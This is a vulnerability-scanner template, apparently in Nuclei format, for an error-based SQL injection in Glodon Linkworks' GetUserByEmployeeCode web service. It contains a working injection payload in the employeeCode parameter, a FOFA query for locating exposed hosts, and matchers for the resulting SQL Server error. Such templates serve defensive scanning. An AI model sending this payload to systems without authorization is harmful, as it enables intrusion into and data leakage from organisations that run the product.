id: glodon-linkworks-getuserbyemployeecode-sqli

info:
  name: 广联达 Linkworks GetUserByEmployeeCode SQL 注入
  author: zan8in
  severity: high
  description: |
    广联达 Linkworks /Org/service/Service.asmx/GetUserByEmployeeCode 的 employeeCode 参数可报错注入，回显 nvarchar 转换失败信息。
  metadata:
    verified: true
    max-request: 1
    fofa-query: header="Services/Identification/login.ashx"
  tags: glodon,linkworks,sqli

http:
  - raw:
      - |
        POST /Org/service/Service.asmx/GetUserByEmployeeCode HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        employeeCode=1'-1/user--'&EncryptData=1

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "在将 nvarchar 值"
          - "转换成数据类型 int 时失败"
        condition: and
      - type: status
        status:
          - 500
